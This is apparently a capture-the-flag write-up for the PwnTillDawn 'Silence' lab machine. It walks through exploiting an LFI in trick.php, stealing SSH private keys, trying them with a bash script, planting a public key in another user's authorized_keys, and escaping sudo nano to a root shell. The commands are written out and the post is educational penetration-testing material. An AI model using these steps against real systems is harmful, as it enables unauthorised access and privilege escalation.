---
title: "PwnTillDawn - Silence"
author: Nasrallah
description: ""
date: 2025-04-15 07:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, linux, medium, sudo, LFI, ffuf, bash, php, ssh, scripting, lfi]
img_path: /assets/img/pwntilldawn/silence
image:
    path: silence.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Silence](https://online.pwntilldawn.com/Target/Show/67) from [PwnTillDawn](https://online.pwntilldawn.com/) is medium box, it starts with a file browser website allowing us to list content of directories in the system, we use that to list the web root where we discover an LFI in one of the php files. We exploit the LFI along side the directory listing to discover a backup file of ssh private keys, after downloading the backup we write a script that helps us find the correct key and login. Inside we find a writeable authorized_keys of a user where we add our public key and login as him, the user has a sudo entry that we easily exploit to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.55                                                             
Host is up (0.14s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION                                                             
21/tcp   open  ftp         vsftpd                                                              
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Jun 12  2020 test
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.66.67.114
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
1055/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-03-19T14:25:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 22m32s
```

We found ftp running on port 22 with anonymous login enabled, port 80 is running an Apache web server, 139/445 belongs to samba and finally ssh is on port 1055.

### FTP

Let's start with ftp and login as `anonymous:`

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ ftp 10.150.150.55                                                                                                                        
Connected to 10.150.150.55.
220 Welcome to blah FTP service.
Name (10.150.150.55:sirius): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||55114|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        133          4096 Jun 12  2020 .
drwxr-xr-x    2 0        133          4096 Jun 12  2020 ..
-rw-r--r--    1 0        0              13 Jun 12  2020 test
226 Directory send OK.
ftp> get test
local: test remote: test
229 Entering Extended Passive Mode (|||8317|)
150 Opening BINARY mode data connection for test (13 bytes).
100% |*************************************************************************************************************************************************|    13        0.19 KiB/s    00:00 ETA
226 Transfer complete.
13 bytes received in 00:00 (0.08 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                              
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ cat test      
nothing here
```

We found a file called test but it has nothing useful for us.

### SMB

Let's try listing shares on the smb server.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ nxc smb 10.150.150.55 -u 'guest' -p '' --shares             
SMB         10.150.150.55   445    UBUNTU           [*] Unix - Samba (name:UBUNTU) (domain:) (signing:False) (SMBv1:False)
SMB         10.150.150.55   445    UBUNTU           [+] \guest: (Guest)
SMB         10.150.150.55   445    UBUNTU           [*] Enumerated shares
SMB         10.150.150.55   445    UBUNTU           Share           Permissions     Remark
SMB         10.150.150.55   445    UBUNTU           -----           -----------     ------
SMB         10.150.150.55   445    UBUNTU           print$                          Printer Drivers
SMB         10.150.150.55   445    UBUNTU           IPC$                            IPC Service (ubuntu server (Samba, Ubuntu))
```

Guest login is enabled but there are no readable shares for us.

### Web

Let's navigate to the website on port 80.

![websiet](1.png)

We only have the default page for apache.

Let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.150.150.55
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://10.150.150.55/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.150.150.55/
200      GET        1l        0w        1c http://10.150.150.55/ajax-search.php
200      GET       52l      118w     1873c http://10.150.150.55/index.php
200      GET      481l      974w     9027c http://10.150.150.55/style.css
200      GET      375l      964w    10918c http://10.150.150.55/index.html
200      GET        8l      770w    57002c http://10.150.150.55/jquery.js
200      GET      778l     4085w    69956c http://10.150.150.55/info.php
[####################] - 16s     4736/4736    0s      found:8       errors:2      
[####################] - 15s     4724/4724    311/s   http://10.150.150.55/
```

We found an index.php and info.php. let's check them out.

![index](2.png)

This is a file browser, trying to read `/etc/passwd` gives nothing.

![error](3.png)

Checking the request on burp shows a POST request to /ajax-search.php with the parameter `searchtxt`.

![burp](4.png)

What is interesting to me is when visiting index.php we see the browsing location set as `Demo` and it is also giving the error `Path is not a directory`.

Maybe there is a way to specify the path in index.php. Let's try fuzzing for hidden parameters and put the value of a directory for example `/var`

```terminal
[★]$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.150.150.55/index.php?FUZZ=/var/' -ac   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.150.150.55/index.php?FUZZ=/var/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

path                    [Status: 200, Size: 5283, Words: 811, Lines: 133, Duration: 120ms]
```

We find that index.php takes the parameter `path` with a value as a directory of linux.

Let's see what we get on the browser.

![filebrowser](5.png)

We got a directory listing of the `/var` directory.

Trying to read file doesn't work unfortunately, let's see what on the web root at `/var/www/html` folder.

![webroot](6.png)

We found some `.save` files which I would guess there are backups, and also found `browser.php` and `trick.php`

Browsing to both files gives us nothing.

Inspecting both request to the files we notice that `browser.php` returns `500 Internal server error` while `trick.php` works just fine.

![500](7.png)

The save files both return php source code, but what's interesting is the `test.php.save` which gives the following.

```php
y<?php

echo '<html>
<body>
Test Page
</body>
</html>
';
include($_GET['page']);

?>
```

This file has a clear Local File Inclusion vulnerability, but there is no `test.php` among the other files. Maybe got renamed to `trick.php`?? Let's try it.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]                      
└──╼[★]$ curl http://10.150.150.55/trick.php?page=/etc/passwd            
root:x:0:0:root:/root:/bin/bash                                                                
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                         
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                           
sys:x:3:3:sys:/dev:/usr/sbin/nologin       
[...]
gary:x:1001:1001::/home/gary:/bin/sh
john:x:1002:1002::/home/john:/bin/sh
sally:x:1003:1003::/home/sally:/bin/sh
alice:x:1004:1004::/home/alice:/bin/sh
ftp:x:127:133:ftp daemon,,,:/srv/ftp/home/:/usr/sbin/nologin
ftpuser:x:1005:1005::/home/ftpuser:/bin/sh
```

It worked!

## **Foothold**

We now have directory listing + file read on the server.

After searching on each user's home directory we come across an `SSHArchiveBackup.tar.gz` file on sally home directory.

![archive](8.png)

Let's download the file using the `LFI` on `trick.php`.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ curl 'http://10.150.150.55/trick.php?page=/home/sally/backup/SSHArchiveBackup.tar.gz' -o ssh.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  179k    0  179k    0     0   113k      0 --:--:--  0:00:01 --:--:--  113k
                                                                                                                                                                                              
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ tar -xf ssh.tar.gz 
                                                                                                                                                                                              
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ ls
private   ssh.tar.gz
```

We got a directory called `private` that contains multiple private ssh keys.

With the help of chatGTP  I wrote the following script that loops through the keys until it finds the correct one.

```bash
#!/bin/bash

for i in id_rsa*; do
    echo "[*] Trying $i"
    output=$(ssh -p 1055 -i "$i" \
        -o IdentitiesOnly=yes \
        -o PreferredAuthentications=publickey \
        -o StrictHostKeyChecking=no \
        -o BatchMode=yes \
        -o ConnectTimeout=5 \
        sally@10.150.150.55 exit 2>&1)

    if echo "$output" | grep -q "password"; then
        echo "[-] '$i' Wrong Key', skipping"
        continue
    fi

    if echo "$output" | grep -q "Permission denied"; then
        echo "[-] '$i' permission denied"
        continue
    fi

    if [ $? -eq 0 ]; then
        echo "[+] Success with $i"
        break
    fi
done
```

> Note that you have to be inside the private directory before running the script

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence/private]
└──╼[★]$ bash ../hack.sh 
[*] Trying id_rsa1
[-] 'id_rsa1' Wrong Key', skipping
[*] Trying id_rsa10
[-] 'id_rsa10' Wrong Key', skipping
[...]
[*] Trying id_rsa[REDACTED]                  
[+] Success with id_rsa[REDACTED]
```

We found the correct key, now let's login.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ ssh -i id_rsa sally@10.150.150.55 -p 1055
Silence Please
Last login: Thu Apr 17 03:09:23 2025 from 10.66.66.230
$ bash
sally@ubuntu:~$ id
uid=1003(sally) gid=1003(sally) groups=1003(sally),1006(netAdmin)
sally@ubuntu:~$
```

## **Privilege Escalation**

After running the `id` command we notice that `sally` is part of the `netAdmin` group, let's use `find` to search for files that belong to this group.

```terminal
sally@ubuntu:~$ find / -type f -group netAdmin 2>/dev/null
/home/john/.ssh/authorized_keys
sally@ubuntu:~$ ls -l /home/john/.ssh/authorized_keys 
-rw-rw-r-- 1 john netAdmin 1118 Jul  4  2020 /home/john/.ssh/authorized_keys
```

We have write permission over `authorized_keys` file of use john, with that we can write our public ssh key to the file and login as john.

Let's generate a new pair of keys.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[/tmp/silence]
└──╼[★]$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:5FizJymdea8LYNBVV/AqThW6kqg3Wp604J3A+jUSgAg sirius@parrot
The key's randomart image is:
+---[RSA 3072]----+
|E       ... +o.  |
|o.   . .   o o   |
|o . . . + . . .  |
|   . . B B o .   |
|    . * S * .    |
|   . + o B o     |
|    * B . . .    |
|   o % * . .     |
|  ..+ *   o.     |
+----[SHA256]-----+
                                                                                                                                                                                              
┌──[10.66.66.230]─[sirius💀parrot]-[/tmp/silence]
└──╼[★]$ ls
id_rsa  id_rsa.pub
```

Now let's copy the id_rsa.pub to `authorized_keys`.

```terminal
sally@ubuntu:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZqq5Ud+vo/8+MqKDGdWfhqnKmigPaxxSiek43csk/lF7aKJlOue8cvgVqPPlpJpTNcE7PoqyFb/JzctkzrSwsg2ujkDYTv/mUzxPiiovv87KkgYddlJbZbYciPOZE1j+GwpyS3mB7qhRoS1Njx8ttK/vxetUjsBsMAaz89dLbTduHTLyn//FpwcbBbztbw677jbi6A3cvO8hhAqKoFZLoBR6LmquNM8VffG1hr4utANhhfQKtbGYyK/SwQ7nex6EokOb/TwfOeBgckFxAX6wjW2bXSwPLFO/4Qb5xyySA6M0kNBzgKeu6tXZTsMAlLTuy+U7tBWGgmaol6UtiEtSnO7uOXd5wkoDUVpJiNjsgeZIBFGG1B3yBjdjcG0xiy1vxO7ZX0H+Q08HO2NGgszFXieknlhCYHtN/x5e5+k+o3b4xkqZdupYCYGYCC0SMX3aV9Ak+D9ysVxnVgCRzf87cCIpsqhjrfWcWe9DcHt04UAmeMaE08lF1ZJx/ynxL0LU= sirius@parrot' >> /home/john/.ssh/authorized_keys 
sally@ubuntu:~$ exit
exit
$ exit
Connection to 10.150.150.55 closed.

┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/silence]
└──╼[★]$ ssh -i /tmp/silence/id_rsa john@10.150.150.55 -p 1055
Silence Please
Last login: Sat Jul  4 02:27:27 2020 from 10.210.210.55
$ bash
john@ubuntu:~$ id
uid=1002(john) gid=1002(john) groups=1002(john),1006(netAdmin)
```

### John -> root

Let's check our privileges.

```terminal
john@ubuntu:~$ sudo -l
Matching Defaults entries for john on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, logfile=/var/log/sudo.log

User john may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/nano
```

We can run nano as root.

We can go to [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) to see the exploit.

We run `sudo nano`, press `CTRL R CTRL X` to enter command execution mode then run `reset; bash 1>&0 2>&0`

```terminal
root@ubuntu:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/john# ls /root
FLAG80.txt  hiddenFile  snap
```

## **References**

<https://github.com/NasrallahBaadi/CTF-Scripts/tree/main/PwnTillDawn/silence>

<https://gtfobins.github.io/gtfobins/nano/#sudo>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
